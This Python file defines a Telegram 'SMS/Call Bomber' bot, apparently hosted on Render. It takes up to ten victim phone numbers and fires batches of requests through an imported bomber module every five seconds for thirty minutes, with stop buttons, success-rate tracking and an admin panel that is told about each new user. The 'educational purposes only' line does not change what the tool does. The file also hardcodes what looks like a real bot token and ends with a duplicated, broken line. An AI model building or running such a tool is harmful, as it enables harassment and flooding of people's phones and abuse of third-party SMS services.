import asyncio
import os
import threading
import logging
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from api_bomber import APIBomber
import json

# ============ Configuration ============
BOT_TOKEN = "8758206225:AAFihR79UEdrGEJKdaheI-EpSoTQ7n9q7Tw"
ADMIN_ID = 1029883095
PORT = int(os.environ.get("PORT", 5000))

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Flask app for Render
app = Flask(__name__)

# Initialize bomber
bomber = APIBomber(max_concurrent=10)

# Store user data with active attacks
user_data = {}
active_attacks = {}

# ============ Flask Routes ============
@app.route('/')
def health():
    return jsonify({
        "status": "running", 
        "message": "Telegram Bomber Bot is active",
        "admin": ADMIN_ID
    }), 200

@app.route('/health')
def health_check():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()}), 200

# ============ Helper Functions ============
def clean_number(number: str) -> str:
    """Clean phone number format"""
    number = number.strip()
    if not number.startswith('+'):
        if number.startswith('0'):
            number = number[1:]
        if len(number) == 10 and number.isdigit():
            number = '+91' + number
        else:
            number = '+' + number
    return number

def is_valid_number(number: str) -> bool:
    """Validate phone number"""
    if not number.startswith('+'):
        return False
    digits = number[1:]
    return len(digits) >= 10 and len(digits) <= 15 and digits.isdigit()

async def update_timer_message(context: ContextTypes.DEFAULT_TYPE):
    """Update timer message"""
    job_data = context.job.data
    user_id = job_data['user_id']
    message_id = job_data['message_id']
    end_time = job_data['end_time']
    
    if user_id not in active_attacks or active_attacks[user_id].get('stop_flag', False):
        return
    
    remaining = end_time - datetime.now()
    minutes = int(remaining.total_seconds() // 60)
    seconds = int(remaining.total_seconds() % 60)
    
    if remaining.total_seconds() <= 0:
        try:
            await context.bot.edit_message_text(
                text=f"✅ *Attack Completed!*\n\n⏰ 30 minutes finished.\n\nUse /start to start new attack.",
                chat_id=user_id,
                message_id=message_id,
                parse_mode="Markdown"
            )
        except:
            pass
        if user_id in active_attacks:
            del active_attacks[user_id]
        return
    
    keyboard = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{user_id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await context.bot.edit_message_text(
            text=f"🔥 *Attack in Progress* 🔥\n\n"
                 f"📱 Target: {job_data['numbers'][0] if len(job_data['numbers']) == 1 else f'{len(job_data["numbers"])} numbers'}\n"
                 f"⏰ Time Left: `{minutes:02d}:{seconds:02d}`\n"
                 f"📊 Batches: `{job_data.get('total_attacks', 0)}`\n"
                 f"✅ Success Rate: `{job_data.get('success_rate', 0)}%`\n\n"
                 f"🔄 Running every 5 seconds\n"
                 f"Press STOP to cancel.",
            chat_id=user_id,
            message_id=message_id,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Timer error: {e}")

async def send_attack_batch(context: ContextTypes.DEFAULT_TYPE):
    """Send attack batch"""
    job_data = context.job.data
    user_id = job_data['user_id']
    numbers = job_data['numbers']
    
    if job_data.get('stop_flag', False):
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🛑 *Attack Stopped*\n\nTotal batches: {job_data.get('total_attacks', 0)}",
                parse_mode="Markdown"
            )
        except:
            pass
        return
    
    if datetime.now() >= job_data['end_time']:
        job_data['stop_flag'] = True
        return
    
    try:
        results = await bomber.bomb_multiple_numbers(numbers)
        
        total_success = 0
        total_apis = 0
        for number, api_results in results.items():
            total_success += sum(1 for r in api_results if r["success"])
            total_apis += len(api_results)
        
        success_rate = (total_success / total_apis) * 100 if total_apis > 0 else 0
        
        job_data['total_attacks'] = job_data.get('total_attacks', 0) + 1
        job_data['success_rate'] = int(success_rate)
        
        logger.info(f"Batch #{job_data['total_attacks']} sent. Success: {success_rate:.1f}%")
        
    except Exception as e:
        logger.error(f"Attack error: {e}")

# ============ Telegram Handlers ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if user_id not in user_data:
        user_data[user_id] = {"first_seen": datetime.now().isoformat()}
        logger.info(f"New user: {user_id}")
        
        if user_id != ADMIN_ID:
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"👤 New user!\nID: `{user_id}`\nName: {update.effective_user.first_name}",
                    parse_mode="Markdown"
                )
            except:
                pass
    
    keyboard = [
        [InlineKeyboardButton("🔥 Start 30-Minute Attack", callback_data="start_attack")],
        [InlineKeyboardButton("📊 Active Attacks", callback_data="active_attacks")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    
    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 *SMS/Call Bomber Bot* 🔥\n\n"
        "• ⏰ 30-minute continuous attacks\n"
        "• 🛑 Stop button to cancel\n"
        "• 📱 Up to 10 numbers\n"
        "• 🚀 9+ APIs\n\n"
        "⚠️ Educational purposes only.\n\n"
        "Click below to start:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle buttons"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "start_attack":
        user_data[user_id] = {**user_data.get(user_id, {}), "state": "awaiting_numbers"}
        await query.edit_message_text(
            "📞 *Send phone number(s)*\n\n"
            "Single: `+919876543210`\n"
            "Multiple: `+919876543210, +919876543211`\n\n"
            "Max 10 numbers. Attack runs 30 minutes.",
            parse_mode="Markdown"
        )
    
    elif data == "active_attacks":
        if user_id in active_attacks and not active_attacks[user_id].get('stop_flag', False):
            attack = active_attacks[user_id]
            remaining = attack['end_time'] - datetime.now()
            minutes = int(remaining.total_seconds() // 60)
            
            text = f"🔄 *Active Attack*\n\n"
            text += f"Time Left: {minutes} minutes\n"
            text += f"Batches: {attack.get('total_attacks', 0)}\n"
            text += f"Success Rate: {attack.get('success_rate', 0)}%"
            
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{user_id}")]]
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text("❌ No active attack.", parse_mode="Markdown")
    
    elif data.startswith("stop_"):
        attacker_id = int(data.split("_")[1])
        if attacker_id == user_id or user_id == ADMIN_ID:
            if attacker_id in active_attacks:
                active_attacks[attacker_id]['stop_flag'] = True
                await query.edit_message_text(
                    f"🛑 Attack stopped!\nBatches: {active_attacks[attacker_id].get('total_attacks', 0)}",
                    parse_mode="Markdown"
                )
    
    elif data == "admin_panel":
        if user_id == ADMIN_ID:
            text = f"📊 *Admin Stats*\n\nActive Attacks: {len(active_attacks)}\nTotal Users: {len(user_data)}"
            keyboard = [[InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")]]
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "stop_all":
        if user_id == ADMIN_ID:
            for uid, attack in active_attacks.items():
                attack['stop_flag'] = True
            await query.edit_message_text("✅ Stopped all attacks!")
    
    elif data == "help":
        await query.edit_message_text(
            "ℹ️ *Help*\n\n"
            "/start - Main menu\n"
            "/stop - Stop attack\n"
            "/status - Check status\n\n"
            "Number format: +919876543210",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle messages"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_data or user_data[user_id].get("state") != "awaiting_numbers":
        await update.message.reply_text("Use /start first.")
        return
    
    await start_attack(update, text)
    user_data[user_id] = user_data.get(user_id, {})

async def start_attack(update: Update, numbers_text: str):
    """Start attack"""
    user_id = update.effective_user.id
    
    # Parse numbers
    if '\n' in numbers_text:
        numbers = [clean_number(n.strip()) for n in numbers_text.split('\n') if n.strip()]
    else:
        numbers = [clean_number(n.strip()) for n in numbers_text.split(',') if n.strip()]
    
    numbers = [n for n in numbers if is_valid_number(n)]
    
    if not numbers:
        await update.message.reply_text("❌ Invalid number! Use: +919876543210")
        return
    
    if len(numbers) > 10:
        await update.message.reply_text(f"❌ Max 10 numbers. You sent {len(numbers)}.")
        return
    
    if user_id in active_attacks and not active_attacks[user_id].get('stop_flag', False):
        await update.message.reply_text("⚠️ You have an active attack. Stop it first.")
        return
    
    end_time = datetime.now() + timedelta(minutes=30)
    
    keyboard = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{user_id}")]]
    message = await update.message.reply_text(
        f"🔥 *Attack Started!*\n\n"
        f"Target: {', '.join(numbers[:3])}{'...' if len(numbers) > 3 else ''}\n"
        f"Duration: 30 minutes\n"
        f"Press STOP to cancel.",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    attack_data = {
        'user_id': user_id,
        'numbers': numbers,
        'end_time': end_time,
        'stop_flag': False,
        'total_attacks': 0,
        'success_rate': 0,
        'message_id': message.message_id,
        'start_time': datetime.now(),
        'duration': 30
    }
    
    active_attacks[user_id] = attack_data
    
    # Schedule jobs
    job_queue = context.application.job_queue
    job_queue.run_repeating(send_attack_batch, interval=5, first=1, data=attack_data)
    job_queue.run_repeating(update_timer_message, interval=30, first=1, data={
        'user_id': user_id,
        'message_id': message.message_id,
        'end_time': end_time,
        'numbers': numbers,
        'total_attacks': 0,
        'success_rate': 0
    })

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop command"""
    user_id = update.effective_user.id
    if user_id in active_attacks:
        active_attacks[user_id]['stop_flag'] = True
        await update.message.reply_text(f"🛑 Stopped! Batches: {active_attacks[user_id].get('total_attacks', 0)}")
    else:
        await update.message.reply_text("No active attack.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Status command"""
    user_id = update.effective_user.id
    if user_id in active_attacks and not active_attacks[user_id].get('stop_flag', False):
        attack = active_attacks[user_id]
        remaining = attack['end_time'] - datetime.now()
        minutes = int(remaining.total_seconds() // 60)
        await update.message.reply_text(
            f"🔄 Status\nTime Left: {minutes}m\nBatches: {attack.get('total_attacks', 0)}\nSuccess: {attack.get('success_rate', 0)}%"
        )
    else:
        await update.message.reply_text("No active attack.")

# ============ Main ============
def run_bot():
    """Run the bot"""
    if not BOT_TOKEN:
        logger.error("No token!")
        return
    
    # Create application - FIXED SYNTAX
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CommandHandler("stop", stop_command))
    telegram_app.add_handler(CommandHandler("status", status_command))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start polling
    logger.info("Starting bot...")
    telegram_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    # Start bot in background thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Run Flask app
    logger.info(f"Starting Flask app on port {PORT}")
    app.run(host="0.0.0.0", port=PORT)    app.run(host="0.0.0.0", port=PORT)
